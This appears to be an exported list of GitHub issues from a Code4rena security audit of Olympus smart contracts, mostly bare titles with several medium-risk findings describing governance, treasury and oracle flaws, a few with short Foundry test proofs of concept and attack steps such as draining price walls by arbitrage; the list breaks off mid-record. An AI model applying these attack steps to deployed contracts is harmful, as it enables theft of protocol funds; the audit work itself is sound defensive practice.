[{"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/232", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/230", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/229", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/228", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/218", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/217", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/216", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/204", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Proposals overwrite", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/201", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor acknowledged"], "target": "2022-08-olympus-findings", "body": "Proposals overwrite"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/199", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/198", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/197", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/196", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/195", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/191", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/190", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/183", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/182", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/181", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/174", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/169", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/168", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/167", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/166", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/165", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/164", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/163", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/162", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/161", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/160", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/158", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/156", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/155", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/154", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Single step ownership model for critical roles", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/153", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/fullyallocated/Default/blob/master/src/Kernel.sol#L192   # Vulnerability details  ### Impact  The `executor` and `admin` roles are important administrative roles that can be set to any arbitrary address that the organisation does not control e.g. `address(0).`   This impact is that the system can no longer be  administered as the `executor` role is the key administrator role for adding, upgrading and removing Kernels, Modules, Policies, Executors and Admins.  Both the `admin` and `executor` roles can be set to an arbitrary address in a single step however it is worse if the `executor` is changed to something like  `address(0)` as no other role can change it back. The `executor` can change the `admin` role but the `admin` cannot change the executor.  Due to the impact I believe this to be of Medium to High severity.  ### Proof of Concept  Below is a test demonstrating that the `executor` role can be set to `address(0)` by the current `executor`;  ```solidity function testCorrectness_ChangeExecutorToAddressZero() public {   // Demonstrate how the executor role can be changed by setting   // it to the multisig address.   vm.startPrank(deployer);   kernel.executeAction(Actions.ChangeExecutor, address(multisig));   vm.stopPrank();   assertEq(kernel.executor(), address(multisig));    // As the current executor set the new executor to be address(0).   vm.prank(multisig);   kernel.executeAction(Actions.ChangeExecutor, address(0));   vm.stopPrank();   assertEq(kernel.executor(), address(0)); } ```  The `admin` role cannot modify the `executor` so if it is set to a arbitrary address that Olympus does not control it cannot be reset;  ```solidity function testCorrectness_AdminCannotChangeExecutor() public {   // Demonstrate how the admin role can be changed by setting   // it to the multisig address.   vm.startPrank(deployer);   kernel.executeAction(Actions.ChangeAdmin, address(multisig));   vm.stopPrank();   assertEq(kernel.admin(), address(multisig));    // As the current admin try and change the executor.   vm.prank(multisig);   err = abi.encodeWithSignature(\"Kernel_OnlyExecutor(address)\", multisig);   vm.expectRevert(err);   kernel.executeAction(Actions.ChangeExecutor, address(0));   vm.stopPrank(); } ```  ### Tools Used  Vim  ### Recommended Remediation Steps  The Kernel should implement a two step ownership change for crucial roles such as the `executor` and `admin`. In the first step the ownership change is \u2018proposed\u2019 and the address of the new owner (for `executor` or `admin`) is stored in a state variable. As part of the proposal `address(0)` can be checked and a revert take place. In the second step the new owner would then need to \u2018accept\u2019 the ownership change by executing a function on the smart contract.   Furthermore I feel that the `executor` should not not be able to change the `admin` role via `Actions.ChangeAdmin` on [L212](https://github.com/fullyallocated/Default/blob/master/src/Kernel.sol#L212) and the `admin` should be able to set a new `executor`. This would ensure there is proper separation of duties between the `admin` and the `executor` roles."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/152", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/151", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/150", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/148", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/147", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/146", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/145", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/141", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/140", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/139", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/138", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/135", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/133", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "OlympusGovernance#executeProposal: reentrancy attack vulnerable function", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/132", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L265 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278-L288   # Vulnerability details  ## Impact Given that the activeProposal change is done before the for loop, if this function is call through one kernel.executeAction(instruction,target) we can call the same instructions (in the same order) again and again, which may or may not affect funds (depending on the instructions).  ## Proof of Concept For instance, if we install a new module, and this module has a vulnerability (even intentional), the next steps can by trigger:  1. Call executeAction 1. This allow us to call kernel.executeAction in the for loop 1. executAction allow us to call **_installModule** 1. **\\_installModule** allow us to call **newModule_.Init** 1. By init we can call now executeProposal again (suppose that the init function interact with a previous vulnerable proxy contract to scam voters to vote in favour of this proposal as if it was a contract which is ok, and before calling executeProposal we change the implementation to allow this attack),  ## Tools Used Static Analysis  ## Recommended Mitigation Steps Use nonReentrant modifier or move the line ```activeProposal = ActivatedProposal(0, 0);``` before the for loop. "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/131", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/129", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/128", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Using a single oracle for price is not recommended", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/121", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-08-olympus-findings", "body": "Using a single oracle for price is not recommended"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/119", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "RBS may redeploy funds automatically if price stays above or below wall for longer than _config.regenWait", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/118", "labels": ["bug", "2 (Med Risk)", "disagree with severity"], "target": "2022-08-olympus-findings", "body": "RBS may redeploy funds automatically if price stays above or below wall for longer than _config.regenWait"}, {"title": "Solmate safetransfer and safetransferfrom doesnot check the codesize of the token address, which may lead to fund loss", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/117", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L110 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L99   # Vulnerability details  ## Impact In `getloan()` and `replayloan()`, the `safetransfer` and `safetransferfrom` doesn't check the existence of code at the token address. This is a known issue while using solmate's libraries.  Hence this may lead to miscalculation of funds and may lead to loss of funds , because if `safetransfer()` and `safetransferfrom()` are called on a token address that doesn't have contract in it, it will always return success, bypassing the return value check. Due to this protocol will think that funds has been transferred and successful , and records will be accordingly calculated, but in reality funds were never transferred.  So this will lead to miscalculation and possibly loss of funds  ## Proof of Concept https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L110 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L99  ## Tools Used Manual code review  ## Recommended Mitigation Steps Use openzeppelin's safeERC20 or implement a code existence check  "}, {"title": "RBS increases systematic risk when implemented with volatile assets and during black swan events", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/116", "labels": ["bug", "disagree with severity", "out of scope", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "RBS increases systematic risk when implemented with volatile assets and during black swan events"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/115", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/108", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "OlympusGovernance - active proposal does not expire", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/100", "labels": ["bug", "2 (Med Risk)"], "target": "2022-08-olympus-findings", "body": "OlympusGovernance - active proposal does not expire"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/96", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Admin cannot be changed to EOA after deployment", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/94", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L252-L253 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L52   # Vulnerability details  ## Impact After contracts are deployed and initialized, the admin address in `Kernel` contract can only be set to a contract. Granting and revoking roles will be possible to do only via a contract, which looks like an unintended behavior since these operations cannot be performed via governance (the governance contract is designed to be the only executor).   ## Proof of Concept Admin address can be changed to any address (EOA or contract) in the `executeAction` function in `Kernel`: https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L252-L253  This piece explicitly allows EOA addresses since the other actions in the function (besides `ChangeExecutor`) are checked to have only a contract as the target (see `ensureContract` function calls in the other actions). This, and the fact that roles cannot be managed via governance, leads to the conclusion that an admin is designed to be an EOA.  However, in the `store` function in `INSTR`, action target can only be a contract: https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L52  After the contracts are deployed, `INSTR` will be the only contract that's allowed to call `Kernel.executeAction`: https://github.com/code-423n4/2022-08-olympus/blob/main/src/scripts/Deploy.sol#L220  Thus, there will be no way to change admin to an EOA. If admin needs to be an EOA, the `INSTR` contract needs to be patched and re-deployed to allow non-contract targets.  ## Tools Used  ## Recommended Mitigation Steps Allow EOA addresses as instruction targets or disallow non-contract admin addresses."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/93", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/90", "labels": ["bug", "QA (Quality Assurance)", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Protocol's Walls / cushion bonds remain active even if heart is not beating", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/89", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L188-L191 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L272 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L346   # Vulnerability details  ## Description The Walls of the RBS mechanism offer zero slippage swaps at the high and low of the moving average spread. The capacity to be swapped at these prices is usually very large, so it must make sure to only be enabled when the prices are guaranteed to be synced. However, there is no such check. If beat() is not called for some time, meaning we cannot determine if the current spread is legit, swap() still operates as usual.   ## Impact The worst case scenario is that the wall is swapping at a losing price, meaning they can be immediately drained via arbitrage bot.   ## Proof of concept  1. Price is X at the start  2. Oracle stops updating for some reason / no one calls beat()  3. Price drops to Y , where Y < low wall centered around X  4. Attacker can perform arbitrage by buying Ohm at external markets at Y and selling Ohm at low wall price, netting the difference.  ## Recommended mitigation steps: Change modifier onlyWhileActive to add a check for beat out of sync: ``` if (block.timestamp > lastBeat + SYNC_THRESHOLD * frequency()) ```  "}, {"title": "Operator::setReserveFactor doesn't check if bond market should be changed", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/83", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-08-olympus-findings", "body": "Operator::setReserveFactor doesn't check if bond market should be changed"}, {"title": "Heart::beat() could be called several times in one block if no one called it for a some time", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/79", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L92 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103   # Vulnerability details  ## Impact `beat()` function is allowed to be called by anyone once in `frequency()` period. The purpose of it is to update the prices and do another operations related to bond market. User who ran it are rewarded. There is no need to run this function more then 1 time in `frequency()` period. However if `beat()` was last time called more then `frequency()` time ago then user can execute `beat()` function `(block.timestamp - lastBeat)/frequency()` times in a row in same block and get rewards.  ## Proof of Concept https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L92 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103   ## Recommended Mitigation Steps https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103 Change this line to `lastBeat = block.timestamp - (block.timestamp - lastBeat) % frequency();` So no matter how much time the `beat()` was no called, it is possible to call it only once per `frequency()`. "}, {"title": "TRSRY susceptible to loan / withdraw confusion", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/75", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L64-L102   # Vulnerability details  ## Impact Treasury allocates approvals in the withdrawApproval mapping which is set via setApprovalFor(). In both withdrawReserves() and in getLoan(), _checkApproval() is used to verify user has enough approval and subtracts the withdraw / loan amount. Therefore, there is no differentiation in validation between loan approval and withdraw approval. Policies which will use getLoan() (currently none) can simply withdraw the tokens without bookkeeping it as a loan.  ## Proof of Concept 1. Policy P has getLoan permission 2. setApprovalFor(policy, token, amount) was called to grant P permission to loan amount 3. P calls withdrawReserves(address, token, amount) and directly withdraws the funds without registering as loan  ## Recommended Mitigation Steps A separate mapping called loanApproval should be implemented, and setLoanApprovalFor() will set it, getLoan() will reduce loanApproval balance.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/73", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/72", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/69", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/68", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/66", "labels": ["bug", "high quality report", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/60", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/59", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/58", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Activating same Policy multiple times in Kernel possible", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/52", "labels": ["bug", "2 (Med Risk)"], "target": "2022-08-olympus-findings", "body": "Activating same Policy multiple times in Kernel possible"}, {"title": "Unexecutable proposals when Actions.MigrateKernel is not last instruction", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/51", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/INSTR.sol#L61   # Vulnerability details  ## Impact & Proof Of Concept In `INSTR.sol`, it is correctly checked that a `ChangeExecutor` instruction only occurs at the last position to avoid situations where the other instructions are deemed as invalid. However, the same problem can occur for `MigrateKernel`. For instance, let's say we have a `MigrateKernel` followed by a `DeactivatePolicy` action. The `MigrateKernel` action will change the value of `kernel` within the policy. The `DeactivatePolicy` action tries to call `setActiveStatus` on the policy. However, this has a `onlyKernel` modifier and the call will therefore fail when it is done after the value of `kernel` was changed.  ## Recommended Mitigation Steps Perform the same check for `MigrateKernel`."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/49", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/48", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/47", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/46", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/45", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/44", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/43", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/41", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/39", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/37", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/34", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/32", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/31", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/30", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/29", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/28", "labels": ["bug", "high quality report", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/27", "labels": ["bug", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/26", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/24", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/22", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-08-olympus-findings", "body": "QA Report"}, {"title": "Gas 